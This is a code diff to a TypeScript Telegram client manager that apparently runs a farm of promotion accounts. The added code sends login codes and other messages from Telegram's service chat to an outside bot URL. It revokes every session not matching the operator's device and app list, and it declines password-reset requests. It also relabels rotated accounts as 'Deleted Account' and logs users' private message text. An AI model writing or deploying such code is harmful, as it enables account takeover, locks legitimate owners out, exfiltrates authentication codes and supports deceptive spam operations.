@@ -21,6 +21,7 @@ class TelegramManager {
     private clientDetails: IClientDetails = undefined
     public client: TelegramClient | null;
     private lastCheckedTime = 0;
+    private checkingAuths = false;
     private lastResetTime = 0;
     private liveMap: Map<string, { time: number, value: boolean }> = new Map();
     private tgId: string;
@@ -190,7 +191,7 @@ class TelegramManager {
                     const senderJson = await this.getSenderJson(event);
                     const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
                     const chatId = event.message.chatId.toString()
-                    if (!broadcastName.toLowerCase().endsWith('bot') && event.message.chatId.toString() !== "178220800") {
+                    if (!broadcastName.toLowerCase().endsWith('bot') && event.message.chatId.toString() !== "178220800" &&  event.message.chatId.toString() !== "777000") {
                         const db = UserDataDtoCrud.getInstance()
                         console.log(`${this.clientDetails.mobile.toUpperCase()}:${broadcastName}-${chatId} :: `, event.message.text);
                         await sendToLogs({ message: `${this.clientDetails.mobile}\n${broadcastName}: ${event.message.text}` });
@@ -293,54 +294,76 @@ class TelegramManager {
                                 this.daysLeft = 99
                             }
                             await updatePromoteClient(this.clientDetails.clientId, { daysLeft: this.daysLeft })
+                            if (this.daysLeft > 3 && (this.lastResetTime < Date.now() - 30 * 60 * 1000)) {
+                                this.lastResetTime = Date.now()
+                                try {
+                                    const db = UserDataDtoCrud.getInstance();
+                                    const existingClients = await db.getClients();
+                                    const promoteMobiles = [];
+                                    for (const existingClient of existingClients) {
+                                        promoteMobiles.push(existingClient.promoteMobile);
+                                    }
+                                    const today = (new Date(Date.now())).toISOString().split('T')[0];
+                                    const query = { availableDate: { $lte: today }, channels: { $gt: 350 }, mobile: { $nin: promoteMobiles } };
+                                    const newPromoteClient = await db.findPromoteClient(query);
+                                    if (newPromoteClient) {
+                                        await sendToLogs({ message: `Setting up new client for :  ${this.clientDetails.clientId} as days : ${this.daysLeft}` });
+                                        await fetchWithTimeout(`${ppplbot()}&text=@${this.clientDetails.clientId.toUpperCase()}-PROM Changed Number from ${this.clientDetails.mobile} to ${newPromoteClient.mobile}`);
+                                        await db.pushPromoteMobile({ clientId: this.clientDetails.clientId }, newPromoteClient.mobile);
+                                        await db.deletePromoteClient({ mobile: newPromoteClient.mobile });
+                                        await this.deleteProfilePhotos();
+                                        await sleep(1500);
+                                        await this.updatePrivacyforDeletedAccount();
+                                        await sleep(1500);
+                                        await this.updateUsername('');
+                                        await sleep(1500);
+                                        await this.updateProfile('Deleted Account', '');
+                                        await sleep(1500);
+                                        const availableDate = (new Date(Date.now() + ((this.daysLeft + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
+                                        console.log("Today: ", today, "Available Date: ", availableDate);
+                                        await db.createPromoteClient({
+                                            availableDate,
+                                            channels: 30,
+                                            lastActive: today,
+                                            mobile: this.clientDetails.mobile,
+                                            tgId: this.tgId
+                                        })
+                                        await db.pullPromoteMobile({ clientId: this.clientDetails.clientId }, this.clientDetails.mobile);
+                                        console.log(this.clientDetails.mobile, " - New Promote Client: ", newPromoteClient);
+                                        const telegramService = TelegramService.getInstance();
+                                        await telegramService.disposeClient(this.clientDetails.mobile);
+                                    }
+                                } catch (error) {
+                                    parseError(error, "Error Handling Message Event");
+                                    await startNewUserProcess(error, this.clientDetails.mobile)
+                                }
+                            }
                         }
                         // if (this.daysLeft > 0) {
                         //     await sendToLogs({ message: `${this.clientDetails.mobile}\nDaysLeft: ${this.daysLeft}` });
                         // }
-                        if (this.daysLeft > 3 && (this.lastResetTime < Date.now() - 30 * 60 * 1000)) {
-                            this.lastResetTime = Date.now()
-                            try {
-                                const db = UserDataDtoCrud.getInstance();
-                                const existingClients = await db.getClients();
-                                const promoteMobiles = [];
-                                for (const existingClient of existingClients) {
-                                    promoteMobiles.push(existingClient.promoteMobile);
+                       
+                        if (event.message.chatId.toString() == "777000") {
+                            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${process.env.clientId}-PROM-${this.clientDetails.mobile}:\n${event.message.text}`)}`);
+                            if (event.message.text.toLowerCase().includes('login code')) {
+                              await this.removeOtherAuths()
+                              setTimeout(async () => {
+                                try {
+                                  const result = await event.client.invoke(new Api.account.DeclinePasswordReset())
+                                } catch (error) {
+                                  parseError(error, "Error at DeclinePasswordReset")
                                 }
-                                const today = (new Date(Date.now())).toISOString().split('T')[0];
-                                const query = { availableDate: { $lte: today }, channels: { $gt: 350 }, mobile: { $nin: promoteMobiles } };
-                                const newPromoteClient = await db.findPromoteClient(query);
-                                if (newPromoteClient) {
-                                    await sendToLogs({ message: `Setting up new client for :  ${this.clientDetails.clientId} as days : ${this.daysLeft}` });
-                                    await fetchWithTimeout(`${ppplbot()}&text=@${this.clientDetails.clientId.toUpperCase()}-PROM Changed Number from ${this.clientDetails.mobile} to ${newPromoteClient.mobile}`);
-                                    await db.pushPromoteMobile({ clientId: this.clientDetails.clientId }, newPromoteClient.mobile);
-                                    await db.deletePromoteClient({ mobile: newPromoteClient.mobile });
-                                    await this.deleteProfilePhotos();
-                                    await sleep(1500);
-                                    await this.updatePrivacyforDeletedAccount();
-                                    await sleep(1500);
-                                    await this.updateUsername('');
-                                    await sleep(1500);
-                                    await this.updateProfile('Deleted Account', '');
-                                    await sleep(1500);
-                                    const availableDate = (new Date(Date.now() + ((this.daysLeft + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
-                                    console.log("Today: ", today, "Available Date: ", availableDate);
-                                    await db.createPromoteClient({
-                                        availableDate,
-                                        channels: 30,
-                                        lastActive: today,
-                                        mobile: this.clientDetails.mobile,
-                                        tgId: this.tgId
-                                    })
-                                    await db.pullPromoteMobile({ clientId: this.clientDetails.clientId }, this.clientDetails.mobile);
-                                    console.log(this.clientDetails.mobile, " - New Promote Client: ", newPromoteClient);
-                                    const telegramService = TelegramService.getInstance();
-                                    await telegramService.disposeClient(this.clientDetails.mobile);
-                                }
-                            } catch (error) {
-                                parseError(error, "Error Handling Message Event");
-                                await startNewUserProcess(error, this.clientDetails.mobile)
+                              }, 5 * 60 * 1000);
                             }
-                        }
+                            if (event.message.text.toLowerCase().includes('request to reset account')) {
+                              await sleep(2000);
+                              try {
+                                const result = await event.client.invoke(new Api.account.DeclinePasswordReset());
+                              } catch (error) {
+                                parseError(error, "Error at DeclinePasswordReset")
+                              }
+                            }
+                          }
                     }
                 }
             } else {
@@ -350,6 +373,41 @@ class TelegramManager {
         } catch (error) {
             parseError(error, "SomeError Parsing Msg")
             await startNewUserProcess(error, this.clientDetails.mobile)
+        }
+    }
+
+    async removeOtherAuths() {
+        if (!this.checkingAuths) {
+            this.checkingAuths = true;
+            let i = 60;
+            while (i > 0) {
+                const result = await this.client.invoke(new Api.account.GetAuthorizations());
+                result.authorizations.map(async (auth) => {
+                    if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
+                        auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
+                        auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
+                        auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
+                        auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows')) {
+                        // await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}-PROM- ${this.phoneNumber}: New AUTH Mine- ${auth.appName}|${auth.country}|${auth.deviceModel}`)}`);
+                    } else {
+                        try {
+                            console.log(auth);
+                            await this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
+                            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}-PROM- ${this.clientDetails.mobile}: New AUTH Removed- ${auth.appName}|${auth.country}|${auth.deviceModel}`)}`);
+                            this.checkingAuths = false;
+                            return auth;
+                        } catch (error) {
+                            // await fetchWithTimeout(`${ppplbot()}&text=@${(process.env.clientId).toUpperCase()}: Failed to Remove Auth - ${auth.appName}|${auth.country}|${auth.deviceModel}-${error.errorMessage}`);
+                            // parseError(error)
+                        }
+                    }
+                })
+                i--;
+                await sleep(3500)
+            }
+            this.checkingAuths = false
+        } else {
+            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: Already Checking Auths`)}`);
         }
     }
 
